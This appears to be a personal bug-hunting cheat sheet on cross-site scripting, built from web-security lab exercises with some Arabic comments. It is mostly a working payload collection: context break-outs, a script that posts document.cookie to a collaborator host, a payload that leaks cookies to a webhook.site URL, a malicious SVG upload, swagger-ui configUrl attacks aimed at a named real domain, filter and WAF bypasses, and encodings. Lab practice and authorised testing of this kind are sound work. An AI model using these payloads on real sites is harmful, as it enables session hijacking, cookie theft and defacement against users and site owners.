# Hunting

# XSS:

**lab1:**

in search bar : habiba

src code:

<h1>0 search results for “habiba”</h1>

payload:

- take from begin of my search to end
    
    habiba”</h1> <svg onload = confirm()> <!—
    

**lab2:**

in search bar : habiba

src code:

var searchterms = “habiba”;

payload:

habiba”; alert();//

**lab3(encoded angle brackets):**

src code:

…. name = search value = “habiba”>

payload:

habiba” onclick = “alert()

lab4:

**DOM XSS in `document.write` sink using source `location.search`** 

open inspect and search for the word

1. **Exploiting cross-site scripting to steal cookies**

```
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

// BURP-COLLABORATOR-SUBDOMAIN بستبدله ب domain of collaborator

1. **Stored XSS using SVG file “in upload photos or files”**
    - file.svg

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert("XSS by BHARAT");
  </script>
</svg>
```

1. payloads for /swagger-ui or /DOC XSS

[https://developers.autosense-cloud.com/swagger-ui/](https://developers.autosense-cloud.com/swagger-ui/)?

configUrl=data:text/html;base64, ewoidXJsIjoiaHR0cHM6Ly9zdGFuZ

GluZy1zYWxOLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==

https://VULNERABLE_JAMF/classicapi/doc/?

configUrl=data:text/html;base64, ewoidXJsIjoiaHR0cHM6Ly9zdGFuZ

GluZy1zYWxOLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==

[https://developers.autosense-cloud.com/swagger-ui/](https://developers.autosense-cloud.com/swagger-ui/)?configUrl=https://jumpy-floor.surge.sh/test.json 

[https://VULNERABLE_JAMF/classicapi/doc/?configUrl=https://jumpy-floor.surge.sh/test.json](https://VULNERABLE_JAMF/classicapi/doc/?configUrl=https://jumpy-floor.surge.sh/test.json) 

1. Payloads
- alert()
- confirm()
- prompt()
- write()
- print()
- “habiba”+alert(1)+”habiba”
- javascript: alert(1)
- <img src=”javascript: alert(1)”>
- <iframe src=”javascript: alert(1)”>
- <svg onload = alert(1)>
- onload alert(1)
- blabla’<h1> <svg onload=confirm()> <!—
- blabla” onclick = “alert()
- <img/src/onerror=.1|alert(document.domain)>
- "><img+id%3D%26%23×101%3B+src%3Dx+onerror%3D%26%23×101%3B%3Balert(document.domain)%3B>
- %22%20%2C%20internalSearchTerm%3A%20%5B"broook"%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b
DECODED : " , internalSearchTerm: ["broook"].map(alert) , numOfSearchResultsReturned: "b
- blabla’; alert();//
- <script>alert(document.cookie)</script>
- }}})</script><script>alert(1)</script>
- ‘”><script>alert(document.cookie)</script>
- “><script>alert(‘<img src=”[https://webhook.site/abcded-asa-daasasada-asdaad-adad?c='+document.cookie+'](https://webhook.site/abcded-asa-daasasada-asdaad-adad?c=%27%2Bdocument.cookie%2B%27) ”/>’);</script> //
- “><script>alert(document.cookie);</script> //
- ‘;</script><script>prompt(1);</script>;//
- `"><script>alert("XSS Test");</script><"`
- `=d1bvs%3c%2fscript%3e%3cscript%3ealert(`XSS`)%3c%2fscript%3ec579g`
- لو الأنا بكتبه بيترفع فى الرابط بحقن ب :
- javascript: alert(1)
    - اول ما الاقى رابط ثانوى او مسار فى اللينك بشيله و بحقن ب :
    https://0a9800ed0439ab938256790300320079.web-security-academy.net/feedback?returnPath=javascript: alert(1)
- javascript: alert(1) —> encode () in URL

1. DOM XSS in JQuery:
    
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
    
    —>write in html file and change highlighted with link
    
2. HTML injection:
    
    payloads:
    
    <h1></h1>
    
    <u></u>
    
    `<img src=x onload = confirm()>`
    
    `<iframe src= https://evil.com><iframe>`
    
    `<a href=https://www.evil.com> click here </a>`
    
    places : 
    
    support section in site
    
3. bypass WAF:
    
    add header —> Contect-Encoding: WAFBYPASS
    
4. `<a> and <iframe> tags accept javascript:alert() <a href= “javascript: alert(1)”>test</a>`

    `<iframe src= “javascript:alert(1)”></iframe>`
    
5. angular:
    
    any payload related to angular will execute in <ng-app>
        like: `{{$on.constructor('alert(1)')()}}`
    
6. apply links:
    
    test if it check only “http” or “https” in url only or check all url
    
7. to prevent damage page with stord xss:
use —> console.log() instead of alert()
8. uni code :
    
    url encode “<” = %3c 
    
    uni code “<” = \u003c 
    
    hex code “<” = \x3c
    

14.

in console write :

eval(”alert(document.cookie)”)

or

eval(”ale”+’rt(document.cookie)’)

1. 

```
<><img src=1 onerror=alert(1)>
```

In an attempt to prevent XSS, the website uses the JavaScript `replace()`
 function to encode angle brackets. However, when the first argument is a
 string, the function only replaces the first occurrence. We exploit 
this vulnerability by simply including an extra set of angle brackets at
 the beginning of the comment. These angle brackets will be encoded, but
 any subsequent angle brackets will be unaffected, enabling us to 
effectively bypass the filter and inject HTML.